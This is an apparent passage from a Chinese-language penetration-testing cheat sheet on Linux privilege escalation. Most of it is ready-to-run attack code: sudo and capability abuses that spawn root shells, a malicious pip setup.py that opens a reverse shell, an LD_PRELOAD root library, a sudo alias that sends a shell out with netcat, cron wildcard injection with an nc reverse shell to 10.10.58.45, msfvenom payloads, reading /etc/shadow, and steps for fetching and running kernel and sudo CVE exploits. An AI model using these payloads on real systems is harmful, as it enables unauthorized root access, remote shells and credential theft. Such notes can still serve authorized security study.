class="string">'/bin/sh'</span>)</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">sudo yum -c <span class="variable">$TF</span>/x --enableplugin=y</span><br></pre></td></tr></table></figure>

<p>有fpm环境</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">TF=$(mktemp -d)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'id'</span> &gt; <span class="variable">$TF</span>/x.sh</span><br><span class="line">fpm -n x -s dir -t rpm -a all --before-install <span class="variable">$TF</span>/x.sh <span class="variable">$TF</span></span><br><span class="line"></span><br><span class="line">sudo yum localinstall -y x-1.0-1.noarch.rpm</span><br></pre></td></tr></table></figure>

<h3 id="sudo-pkexec"><a href="#sudo-pkexec" class="headerlink" title="sudo pkexec"></a>sudo pkexec</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo pkexec --user root &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>

<h3 id="sudo-systemctl"><a href="#sudo-systemctl" class="headerlink" title="sudo systemctl"></a>sudo systemctl</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo systemctl</span><br><span class="line">!sh</span><br></pre></td></tr></table></figure>

<p>创建一个服务的方式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">TF&#x3D;$(mktemp).service</span><br><span class="line">echo &#39;[Service]</span><br><span class="line">Type&#x3D;oneshot</span><br><span class="line">ExecStart&#x3D;&#x2F;bin&#x2F;sh -c &quot;id &gt; &#x2F;tmp&#x2F;output&quot;</span><br><span class="line">[Install]</span><br><span class="line">WantedBy&#x3D;multi-user.target&#39; &gt; $TF</span><br><span class="line">sudo systemctl link $TF</span><br><span class="line">sudo systemctl enable --now $TF</span><br></pre></td></tr></table></figure>

<h3 id="sudo-journalctl"><a href="#sudo-journalctl" class="headerlink" title="sudo journalctl"></a>sudo journalctl</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo journalctl</span><br><span class="line">!&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>

<h3 id="sudo-strace"><a href="#sudo-strace" class="headerlink" title="sudo strace"></a>sudo strace</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo strace -o &#x2F;dev&#x2F;null &#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure>

<h3 id="sudo-taskset"><a href="#sudo-taskset" class="headerlink" title="sudo taskset"></a>sudo taskset</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo taskset 1 &#x2F;bin&#x2F;sh -p</span><br></pre></td></tr></table></figure>

<h3 id="sudo-pip-pip3"><a href="#sudo-pip-pip3" class="headerlink" title="sudo pip/pip3"></a>sudo pip/pip3</h3><h4 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">TF=$(mktemp -d)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"import os; os.execl('/bin/sh', 'sh', '-c', 'sh &lt;<span class="variable">$(tty)</span> &gt;<span class="variable">$(tty)</span> 2&gt;<span class="variable">$(tty)</span>')"</span> &gt; <span class="variable">$TF</span>/setup.py</span><br><span class="line">sudo pip3 install <span class="variable">$TF</span></span><br></pre></td></tr></table></figure>

<p>如果直接利用不行，那就是试试先打开一个python pty，再尝试利用。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -c <span class="string">'import pty;pty.spawn("/bin/bash")'</span></span><br><span class="line"></span><br><span class="line">TF=$(mktemp -d)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"import os; os.execl('/bin/sh', 'sh', '-c', 'sh &lt;<span class="variable">$(tty)</span> &gt;<span class="variable">$(tty)</span> 2&gt;<span class="variable">$(tty)</span>')"</span> &gt; <span class="variable">$TF</span>/setup.py</span><br><span class="line">sudo pip3 install <span class="variable">$TF</span></span><br></pre></td></tr></table></figure>

<h4 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h4><p>安装恶意setup.py脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from setuptools import setup</span><br><span class="line">from setuptools.command.install import install</span><br><span class="line">import os, socket, subprocess</span><br><span class="line"></span><br><span class="line">class CustomInstall(install):</span><br><span class="line">  def run(self):</span><br><span class="line">    install.run(self)</span><br><span class="line">    s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    s.connect((&quot;127.0.0.1&quot;,1234))</span><br><span class="line">    os.dup2(s.fileno(),0)</span><br><span class="line">    os.dup2(s.fileno(),1)</span><br><span class="line">    os.dup2(s.fileno(),2)</span><br><span class="line">    p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;])</span><br><span class="line"></span><br><span class="line">setup(name&#x3D;&#39;FakePip&#39;,</span><br><span class="line">      version&#x3D;&#39;0.0.1&#39;,</span><br><span class="line">      description&#x3D;&#39;Reverse shell&#39;,</span><br><span class="line">      url&#x3D;&#39;xx.xx.xx.xx&#39;,</span><br><span class="line">      author&#x3D;&#39;nathan&#39;,</span><br><span class="line">      author_email&#x3D;&#39;xx@xx&#39;,</span><br><span class="line">      license&#x3D;&#39;MIT&#39;,</span><br><span class="line">      zip_safe&#x3D;False,</span><br><span class="line">      cmdclass&#x3D;&#123;&#39;install&#39;: CustomInstall&#125;)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo pip3 install . --upgrade --force-reinstall</span><br></pre></td></tr></table></figure>

<h3 id="sudo-CVE-2019-14287-提权"><a href="#sudo-CVE-2019-14287-提权" class="headerlink" title="sudo CVE-2019-14287 提权"></a>sudo CVE-2019-14287 提权</h3><p>要求</p>
<ul>
<li>sudo版本低于v1.8.28</li>
<li>/etc/sudoers 配置要求如下(要求一组特定权限)<ul>
<li><code>&lt;user&gt; ALL=(ALL:!root) NOPASSWD: ALL</code></li>
</ul>
</li>
</ul>
<p><code>&lt;user&gt; ALL=(ALL:!root) NOPASSWD: ALL</code>代表该用户能以<strong>非root</strong>的身份运行所有命令</p>
<p>注意:<strong>root的uid永远为0</strong></p>
<p>使用这个漏洞之前,我们需要知道sudo的一个参数<code>-u</code></p>
<p><code>sudo -u#0 &lt;command&gt;</code></p>
<p>即以uid为0的用户去运行这个命令.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ sudo -u#0 whoami</span><br><span class="line">[sudo] password for abc:</span><br><span class="line">root</span><br><span class="line"></span><br><span class="line">$ sudo -u#1 whoami</span><br><span class="line">bin</span><br></pre></td></tr></table></figure>

<p>那么如果我们输入一个uid位为无符号的整型的时候会怎么样呢??</p>
<p><code>sudo -u#-1 whoami</code></p>
<details>
<summary>答案</summary>
<pre><code>

<p><img src="https://images.atsud0.me/images/post/Screenshot_20200511_110433.jpg" alt="sd"><br>如果目标机器的sudo版本以及拥有特定权限都满足以上条件,那么你就能获得root权限.</p>
<p>Sudo会错误地将<code>-1</code>或者<code>4294967295</code>读取为0（即root）。 这意味着通过将UID指定为<code>-1</code>或<code>4294967295</code>，就能以root身份执行命令</p>
<p>再次提醒:您需要sudo版本以及拥有非root sudo权限的情况下,才能起作用.否则毫无价值.<br></code></pre></p>
</details>

<h3 id="sudo-CVE-2019-18634-提权"><a href="#sudo-CVE-2019-18634-提权" class="headerlink" title="sudo CVE-2019-18634 提权"></a>sudo CVE-2019-18634 提权</h3><p>sudo版本要求</p>
<ul>
<li>sudo版本低于1.8.26</li>
<li>sudo配置开启<code>pwfeedback</code></li>
</ul>
<p>这与<code>CVE-2019-14287</code>的不同之处在于,<code>CVE-2019-14287</code>要求特定的权限,而<code>CVE-2019-18634</code>不需要任何特定的权限,即使是未在sudoers文件中列出的用户也可利用此漏洞。</p>
<p><code>CVE-2019-18634</code> 使用到了缓冲区溢出攻击(Buffer Overflow)</p>
<p><code>pwfeedback</code>选项是可让用户在输入密码时提供可视化的反馈（辅助输入）。</p>
<p><code>pwfeedback</code> 在Linux Mint和 elementary OS 默认开启,但在其他系统就不是了.需要管理员开启才能生效</p>
<blockquote>
<p>Sudo的开发者Todd C. Miller表示，利用此漏洞和sudo权限无关，只需要启用了pwfeedback即可。</p>
</blockquote>
<p>当sudo提示输入密码时，可以通过管道符将大量输入传递给sudo，从而重现漏洞，例如:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ perl -e &#39;print((&quot;A&quot; x 100 . &quot;\x&#123;00&#125;&quot;) x 50)&#39; | sudo -S id</span><br><span class="line">Password: Segmentation fault</span><br></pre></td></tr></table></figure>
<p>在这个命令中，我们使用Perl生成大量无用字符，然后使用管道符将这些字符作为密码传递给sudo命令。</p>
<p>但是这实际上并没有给我们root权限，相反，它向我们显示了一个错误消息:Segmentation fault，这基本上意味着我们试图访问一些我们不应该访问的内存。这证明了缓冲区溢出漏洞的存在:现在我们只需要利用它</p>
<p>exp作者:<a href="https://github.com/saleemrashid/sudo-cve-2019-18634" target="_blank" rel="noopener">saleemrashid</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;saleemrashid&#x2F;sudo-cve-2019-18634&#x2F;master&#x2F;exploit.c</span><br><span class="line"></span><br><span class="line">gcc -o exploit exploit.c</span><br><span class="line"></span><br><span class="line">.&#x2F;exploit</span><br></pre></td></tr></table></figure>
<p><img src="https://images.atsud0.me/images/post/CVE-2019-18634-Demo-1.png" alt="cve-2019-18634"></p>
<p>漏洞出现的原因有两个：</p>
<ul>
<li><p>当从终端设备以外的设备读取数据时，pwfeedback选项不会被忽略。由于缺少终端，已保存的行擦除字符的版本保持其初始值0。</p>
</li>
<li><p>如果出现写错误，擦除星号行的代码就无法正确地重置缓冲区位置，但是会重置剩余的缓冲区长度。因此，getln()函数可以写入缓冲区的末尾。</p>
</li>
</ul>
<h3 id="sudo-LD-PRELOAD环境变量提权"><a href="#sudo-LD-PRELOAD环境变量提权" class="headerlink" title="sudo LD_PRELOAD环境变量提权"></a>sudo LD_PRELOAD环境变量提权</h3><blockquote>
<p>Linux操作系统的动态链接库在加载过程中，动态链接器会先读取LD_PRELOAD环境变量和默认配置文件/etc/ld.so.preload，并将读取到的动态链接库文件进行预加载，即使程序不依赖这些动态链接库，LD_PRELOAD环境变量和/etc/ld.so.preload配置文件中指定的动态链接库依然会被装载,因为它们的优先级比LD_LIBRARY_PATH环境变量所定义的链接库查找路径的文件优先级要高，所以能够提前于用户调用的动态库载入。<br><a href="https://payloads.online/archivers/2020-01-01/1" target="_blank" rel="noopener">Linux权限维持之LD_PRELOAD</a></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;types.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">void _init() &#123;</span><br><span class="line">    unsetenv(&quot;LD_PRELOAD&quot;);</span><br><span class="line">    setgid(0);</span><br><span class="line">    setuid(0);</span><br><span class="line">    system(&quot;&#x2F;bin&#x2F;bash&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -fPIC -shared -o &#x2F;tmp&#x2F;x.so x.c -nostartfiles</span><br><span class="line">sudo LD_PRELOAD&#x3D;&#x2F;tmp&#x2F;x.so apache2</span><br></pre></td></tr></table></figure>

<h3 id="记一个比较秀的sudo提权"><a href="#记一个比较秀的sudo提权" class="headerlink" title="记一个比较秀的sudo提权"></a>记一个比较秀的sudo提权</h3><p><a href="https://redd.it/hn6vy5" target="_blank" rel="noopener">Why does .bashrc have write access by non-root users by default?</a></p>
<blockquote>
<p>Why does .bashrc have write access by non-root users by default?<br>I am not really sure if there is any non-malicious use cases where ~/.bashrc needs to be writable without root. Anyone with write access to .bashrc can make an alias like<br>    alias sudo=’sudo BAD_COMMAND; sudo’<br>Wouldn’t it make more sense to make bashrc harder to write to?</p>
</blockquote>
<p>如果你拿到了一个非root,但是又拥有sudo权限的用户的shell.而你不知道该用户的密码,可以这样提权.</p>
<p>修改该用户的shell的配置文件,添加一个别名sudo</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">alias sudo &#x3D;&#39;sudo nc -nv IP PORT 2&gt;&#x2F;dev&#x2F;null &amp;;sudo&#39;</span><br></pre></td></tr></table></figure>
<p>监听端口,等待用户上线后sudo命令输入密码获得shell.<br><img src="https://images.atsud0.me/images/post/Screenshot_20200708_151735.jpg" alt=""></p>
<h2 id="Capabilities"><a href="#Capabilities" class="headerlink" title="Capabilities"></a>Capabilities</h2><p><a href="https://cloud.tencent.com/developer/article/1529342" target="_blank" rel="noopener">Capabilities</a></p>
<blockquote>
<p>Capabilities 机制是在 Linux 内核 2.2 之后引入的，原理很简单，就是将之前与超级用户 root（UID=0）关联的特权细分为不同的功能组，Capabilites 作为线程（Linux 并不真正区分进程和线程）的属性存在，每个功能组都可以独立启用和禁用。其本质上就是将内核调用分门别类，具有相似功能的内核调用被分到同一组中。<br>这样一来，权限检查的过程就变成了：在执行特权操作时，如果线程的有效身份不是 root，就去检查其是否具有该特权操作所对应的 capabilities，并以此为依据，决定是否可以执行特权操作。</p>
</blockquote>
<h3 id="管理工具"><a href="#管理工具" class="headerlink" title="管理工具"></a>管理工具</h3><ul>
<li>getcap</li>
<li>setcap</li>
<li>capsh</li>
<li>filecap</li>
</ul>
<p>这些命令来自libcap和labcap-ng包。如名字一样，get用于查询，set用于设置，capsh则用于查当前shell进程的capabilities，filecap既能设置也能查询。</p>
<h3 id="查找设置了Capabilities的可执行文件"><a href="#查找设置了Capabilities的可执行文件" class="headerlink" title="查找设置了Capabilities的可执行文件"></a>查找设置了Capabilities的可执行文件</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">getcap</span> -r / 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<h3 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">perl -e <span class="string">'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'</span></span><br></pre></td></tr></table></figure>

<h3 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb -nx -ex <span class="string">'python import os; os.setuid(0)'</span> -ex <span class="string">'!sh'</span> -ex quit</span><br></pre></td></tr></table></figure>

<h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">php -r <span class="string">"posix_setuid(0); system('/bin/sh');"</span></span><br></pre></td></tr></table></figure>

<h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">'import os; os.setuid(0); os.system("/bin/sh")'</span></span><br></pre></td></tr></table></figure>

<h3 id="rvim"><a href="#rvim" class="headerlink" title="rvim"></a>rvim</h3><p>需要支持python3模块。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rvim -c <span class="string">':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'</span></span><br></pre></td></tr></table></figure>

<h3 id="vim"><a href="#vim" class="headerlink" title="vim"></a>vim</h3><p>需要支持python3模块。<code>vim --version</code>查询，是否支持py3</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim -c <span class="string">':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'</span></span><br></pre></td></tr></table></figure>

<h3 id="tar"><a href="#tar" class="headerlink" title="tar"></a>tar</h3><p>tar可以使用cap_dac_read_search绕过文件的读权限检查以及目录的读/执行权限的检查，来读取敏感信息。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tar cvf shadow.tar &#x2F;etc&#x2F;shadow  &#x2F;&#x2F;创建压缩文件</span><br><span class="line"></span><br><span class="line">tar -xvf shadow.tar  &#x2F;&#x2F;解压缩</span><br><span class="line"></span><br><span class="line">cd etc  &#x2F;&#x2F;进入解压缩的目录</span><br><span class="line"></span><br><span class="line">chmod +r shadow  &#x2F;&#x2F;赋予读权限</span><br><span class="line"></span><br><span class="line">cat shadow | grep root  &#x2F;&#x2F;查看shadow文件的内容</span><br></pre></td></tr></table></figure>
<p>zip等程序也可以达到相同的目标。</p>
<p>问题：如果给tar设置 cap_setuid 能否使用通配符提权呢？</p>
<blockquote>
<p>结果：好的，不行</p>
</blockquote>
<h3 id="openssl"><a href="#openssl" class="headerlink" title="openssl"></a>openssl</h3><p>当openssl的Capabilities为空时。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;使用openssl生成证书</span><br><span class="line"></span><br><span class="line">cd &#x2F;tmp</span><br><span class="line"></span><br><span class="line">openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;启动web服务器，监听1337端口</span><br><span class="line"></span><br><span class="line">cd &#x2F;</span><br><span class="line"></span><br><span class="line">python3 -m http.server 8000</span><br><span class="line"></span><br><span class="line">openssl s_server -key &#x2F;tmp&#x2F;key.pem -cert &#x2F;tmp&#x2F;cert.pem -port 1337 -HTTP</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;访问本机的web服务，读取&#x2F;etc&#x2F;shadow文件</span><br><span class="line"></span><br><span class="line">curl -k “https:&#x2F;&#x2F;127.0.0.1:8000&#x2F;etc&#x2F;shadow“</span><br></pre></td></tr></table></figure>


<h2 id="cron-jobs-提权"><a href="#cron-jobs-提权" class="headerlink" title="cron jobs 提权"></a>cron jobs 提权</h2><p>cron daemon是它可以安排在特定时间，做特定工作。<br>如果你不了解crontab，你可以看看<a href="https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=2ahUKEwjOitqzkuXoAhWHUN4KHcQEA4oQFjAAegQIARAB&url=http%3A%2F%2Fcn.linux.vbird.org%2Flinux_basic%2F0430cron.php&usg=AOvVaw0Eocer1SxnUTJnLF6i1fdp" target="_blank" rel="noopener">这里</a><br>总而言之，crontab可以安排工作。而它的格式如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># * * * * * user command</span><br><span class="line">1 0 24 * * * root touch &#x2F;root&#x2F;hello.txt</span><br></pre></td></tr></table></figure>
<p>ID 分 时 日 月 周 用户 命令<br>一个星号代表一个数，而数则表示时间。<br>表示每天的24点整，root用户在家目录中创建一个hello.txt的文件</p>
<h3 id="cron-jobs-文件权限（文件重写）"><a href="#cron-jobs-文件权限（文件重写）" class="headerlink" title="cron jobs 文件权限（文件重写）"></a>cron jobs 文件权限（文件重写）</h3><p>而如果你刚好看到排程中，有一个以root用户执行的脚本，而恰好那个脚本可以让普通用户写入。<br>那么你可以重写那个脚本，执行你想要的操作(如msfvenom生成的木马)。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p cmd&#x2F;unix&#x2F;reverse_netcat lhost&#x3D;LOCALIP lport&#x3D;8888 R</span><br></pre></td></tr></table></figure>
<p>生成一个可以反弹到netcat的shell。R参数是格式控制，剔除bad characters。<br>把msfvenom输出的代码写入你可以写入的脚本就可以了。<br>监听指令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvp 8888</span><br></pre></td></tr></table></figure>
<p>开启监听端口后，等待工作排程的执行。一旦执行，那你应该会获得一个root的shell了。</p>
<h3 id="cron-jobs环境变量提权"><a href="#cron-jobs环境变量提权" class="headerlink" title="cron jobs环境变量提权"></a>cron jobs环境变量提权</h3><p><strong>只有在crontab有添加用户变量的前提下做</strong></p>
<p>如</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SHELL&#x3D;&#x2F;bin&#x2F;sh</span><br><span class="line">PATH&#x3D;&#x2F;home&#x2F;user:&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;sbin:&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin</span><br><span class="line"></span><br><span class="line">1 0 24 * * * bash shell.sh</span><br></pre></td></tr></table></figure>


<p>那么此时，我们就可以修改在<code>/home/user</code>下新建一个名为<code>shell.sh</code>的文件，脚本内容可以是直接运行一个shell，也可以直接netcat反向连接给攻击机。<br>新建好之后要给<code>shell.sh</code>添加运行权限。</p>
<h3 id="cron-jobs-通配符提权"><a href="#cron-jobs-通配符提权" class="headerlink" title="cron jobs 通配符提权"></a>cron jobs 通配符提权</h3><p>通配符提权相关文章:</p>
<ul>
<li><a href="https://www.secpulse.com/archives/72965.html" target="_blank" rel="noopener">利用通配符实现Linux本地提权-安全脉搏</a></li>
<li><a href="https://www.freebuf.com/articles/system/175453.html" target="_blank" rel="noopener">如何使用Cron Jobs实现Linux提权</a></li>
<li><a href="https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/" target="_blank" rel="noopener">Exploiting wildcards on Linux</a></li>
</ul>
<p><code>cat /etc/crontab</code> 内容如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SHELL&#x3D;&#x2F;bin&#x2F;sh</span><br><span class="line">PATH&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;sbin:&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin</span><br><span class="line"></span><br><span class="line">1 0 24 * * * tar cf &#x2F;home&#x2F;milesydson&#x2F;backups&#x2F;backup.tgz &#x2F;var&#x2F;www&#x2F;html&#x2F;*</span><br></pre></td></tr></table></figure>

<p>利用方式如下</p>
<figure class="highlight shell"><figcaption><span>payload</span></figcaption><table><tr><td class="code"><pre><span class="line">cd /var/www/html/</span><br><span class="line">echo ""&gt;"--checkpoint-action=exec=sh shell.sh"</span><br><span class="line">echo ""&gt;"--checkpoint=1"</span><br><span class="line">echo "mkfifo /tmp/cflw;nc 10.10.58.45 8888 0&lt;/tmp/clfw |/bin/sh &gt;/tmp/cflw 2&gt;&amp;1"&gt;shell.sh</span><br></pre></td></tr></table></figure>

<p>但是查看crontab不能只查看/etc/crontab一个地方，还要看/etc/cron.*的任务，系统定时任务，看看有没什么能利用的<br><img src="https://images.atsud0.me/images/post/Screenshot_20200623_162209.jpg" alt=""></p>
<p>以及使用<code>crontab -l</code>也看下</p>
<h2 id="环境变量提权-劫持环境变量"><a href="#环境变量提权-劫持环境变量" class="headerlink" title="环境变量提权(劫持环境变量)"></a>环境变量提权(劫持环境变量)</h2><p>什么是环境变量？</p>
<blockquote>
<p>PATH is an environmental variable in Linux and Unix-like operating systems which specifies directories that hold executable programs. When the user run any command in the terminal, it searches for executable files with the help of the PATH Variable in response to commands executed by a user.<br>It is very simple to view the Path of the relevant user with help of the command “echo $PATH”.</p>
</blockquote>
<p>PATH是Linux和类似Unix的操作系统中的环境变量，它指定包含可执行程序的目录。 当用户在终端中运行任何命令时，它会响应用户执行的命令，在PATH变量的帮助下搜索可执行文件。</p>
<blockquote>
<p>使用一个环境变量对一个SUID二进制文件进行提权的话，需要有一个前提条件，那就是：系统管理员错误的写了脚本的路径（没有写绝对路径，如果没有写死路径，而是单单使用<code>ls</code>，这样我们就可以去修改系统的环境变量使其执行，我们伪造的文件。达到我们想要的效果。</p>
</blockquote>
<p>如果我们有一个具有SUID的二进制文件，运行它，观察它调用了什么系统进程 如<code>ps</code>，<code>ls</code>等。</p>
<p>假设我们已经有一个具有SUID的二进制文件，而运行它后将会执行<code>ls</code>的程序。我们可以写一个模拟可执行文件<br>格式是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;你想要运行的命令&quot; &gt; 我们模仿的可执行文件</span><br></pre></td></tr></table></figure>
<p>如上文所说，我们有一个可以执行ls的二进制文件，并且它具有SUID位。而我们是要拿到shell，那我们应该这样写</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;&#x2F;bin&#x2F;bash&quot; &gt; ls</span><br></pre></td></tr></table></figure>
<p>给生成的文件，添加一个权限</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod +x ls</span><br></pre></td></tr></table></figure>
<p>最后，添加一个环境变量。我们生成的ls文件所处在的目录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export PATH&#x3D;生成的ls文件所再的目录:$PATH</span><br><span class="line">如果ls文件在&#x2F;tmp下就</span><br><span class="line">export PATH&#x3D;&#x2F;tmp:$PATH</span><br></pre></td></tr></table></figure>
<p>而此时再执行一次那个具有SUID的二进制文件后，你就会发现我们已经拿到root的shell了。</p>
<p><a href="https://www.anquanke.com/post/id/146799#h3-9" target="_blank" rel="noopener">利用PATH环境变量进行Linux提权</a></p>
<blockquote>
<p>思考题:如果看到crontab有一个自动执行某个脚本的任务，并且脚本内程序路径并没有被写死。是否能通过改变环境变量的方式去反弹一个shell呢?</p>
</blockquote>
<details>
<summary>答案</summary>
<pre><code>
不能，因为crontab有单独的环境变量，不会被用户的修改的临时变量所影响。
</code></pre>
</details>


<h2 id="内核漏洞提权"><a href="#内核漏洞提权" class="headerlink" title="内核漏洞提权"></a>内核漏洞提权</h2><h3 id="脏牛提权-CVE-2016-5195"><a href="#脏牛提权-CVE-2016-5195" class="headerlink" title="脏牛提权 CVE-2016-5195"></a>脏牛提权 CVE-2016-5195</h3><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2016-5195" title="" target="">CVE-2016-5195</a>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc dc32.c -o cowroot -pthread</span><br></pre></td></tr></table></figure>

<p>去exploit-db找到利用补丁，编译后运行就可以了。</p>
<h3 id="CVE-2003-0127"><a href="#CVE-2003-0127" class="headerlink" title="CVE-2003-0127"></a>CVE-2003-0127</h3><a href="https://www.exploit-db.com/exploits/3" title="" target="">ptrace&#x2F;kmod</a>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200615_195603.jpg" alt=""></p>
<h3 id="CVE-2009-2698"><a href="#CVE-2009-2698" class="headerlink" title="CVE-2009-2698"></a>CVE-2009-2698</h3><p>{ % link “Linux Kernel 2.6 &lt; 2.6.19 (White Box 4 / CentOS 4.4/4.5 / Fedora Core 4/5/6 x86) - ‘ip_append_data()’ Ring0 Privilege Escalation (1)” “<a href="https://www.exploit-db.com/exploits/9542&quot;" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/9542&quot;</a> % }</p>
<h3 id="CVE-2010-2959"><a href="#CVE-2010-2959" class="headerlink" title="CVE-2010-2959"></a>CVE-2010-2959</h3><p><a href="https://www.exploit-db.com/exploits/14814" target="_blank" rel="noopener">Linux Kernel &lt; 2.6.36-rc1 (Ubuntu 10.04 / 2.6.32) - ‘CAN BCM’ Local Privilege Escalation</a></p>
<p>内核：2.6.32-generic</p>
<p>版本：Ubuntu 10.04</p>
<p>ExpDB ID:14814</p>
<h3 id="CVE-2013-2094"><a href="#CVE-2013-2094" class="headerlink" title="CVE-2013-2094"></a>CVE-2013-2094</h3><p>内核:2.6.38-8-server #42-Ubuntu<br>版本:Ubuntu 11.04<br><a href="https://www.exploit-db.com/download/26131" target="_blank" rel="noopener">CVE-2013-2094</a></p>
<h3 id="CVE-2017-16995"><a href="#CVE-2017-16995" class="headerlink" title="CVE-2017-16995"></a>CVE-2017-16995</h3><p>影响内核</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Debian 9.0 kernel 4.9.0-3-amd64;</span><br><span class="line">Deepin 15.5 kernel 4.9.0-deepin13-amd64;</span><br><span class="line">ElementaryOS 0.4.1 kernel 4.8.0-52-generic;</span><br><span class="line">Fedora 25 kernel 4.8.6-300.fc25.x86_64;</span><br><span class="line">Fedora 26 kernel 4.11.8-300.fc26.x86_64;</span><br><span class="line">Fedora 27 kernel 4.13.9-300.fc27.x86_64;</span><br><span class="line">Gentoo 2.2 kernel 4.5.2-aufs-r;</span><br><span class="line">Linux Mint 17.3 kernel 4.4.0-89-generic;</span><br><span class="line">Linux Mint 18.0 kernel 4.8.0-58-generic;</span><br><span class="line">Linux Mint 18.3 kernel 4.13.0-16-generic;</span><br><span class="line">Mageia 6 kernel 4.9.35-desktop-1.mga6;</span><br><span class="line">Manjero 16.10 kernel 4.4.28-2-MANJARO;</span><br><span class="line">Solus 3 kernel 4.12.7-11.current;</span><br><span class="line">Ubuntu 14.04.1 kernel 4.4.0-89-generic;</span><br><span class="line">Ubuntu 16.04.2 kernel 4.8.0-45-generic;</span><br><span class="line">Ubuntu 16.04.3 kernel 4.10.0-28-generic;</span><br><span class="line">Ubuntu 17.04 kernel 4.10.0-19-generic;</span><br><span class="line">ZorinOS 12.1 kernel 4.8.0-39-generic.</span><br></pre></td></tr></table></figure>

<p>exp</p>
<ul>
<li><a href="https://www.exploit-db.com/exploits/45058" target="_blank" rel="noopener">msf</a></li>
<li><a href="https://www.exploit-db.com/exploits/45010" target="_blank" rel="noopener">45010(好用！推荐)</a></li>
</ul>
<h3 id="CVE-2010-4170"><a href="#CVE-2010-4170" class="headerlink" title="CVE-2010-4170"></a>CVE-2010-4170</h3><p>内核:linux 2.6.18-194<br>版本:Centos5.5</p>
<p>systemtap漏洞 linux 2.6.18-194内核提权</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">printf &quot;install uprobes &#x2F;bin&#x2F;sh&quot; &gt; exploit.conf; MODPROBE_OPTIONS&#x3D;&quot;-C exploit.conf&quot; staprun -u whatever</span><br></pre></td></tr></table></figure>
<ul>
